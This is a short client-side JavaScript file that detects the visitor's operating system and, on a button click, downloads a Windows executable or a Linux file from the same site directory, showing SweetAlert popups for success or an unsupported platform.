
function getOS() {
  const userAgent = window.navigator.userAgent;

  if (/android/i.test(userAgent)) return "Android";
  if (/iphone|ipad|ipod/i.test(userAgent)) return "iOS";
  if (/windows/i.test(userAgent)) return "Windows";
  if (/macintosh|mac os x/i.test(userAgent)) return "MacOS";
  if (/linux/i.test(userAgent)) return "Linux";

  return "Unknown";
}


function startDownload() {
  const link = document.createElement('a');
  const os = getOS();

  const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);

  if (os == "Linux") {
    link.href = basePath + 'linux___CLICK_TO_OPEN';
    link.download = 'linux___CLICK_TO_OPEN';

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  } else if (os == "Windows") {
    link.href = basePath + 'Windows.exe';
    link.download = 'Windows.exe';

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  } else {
    Swal.fire({
      title: "Sorry, " + os + " is not currently supported.",
      icon: "info",
      background: '#181818',
      color: '#fff'
    });
    return;
  }

  Swal.fire({
    title: "File downloaded successfully!",
    icon: "success",
    background: '#181818',
    color: '#fff'
  });
}


document.getElementById('download-btn').addEventListener('click', function () {


  // For testing, uncomment the line below:
  startDownload();
});
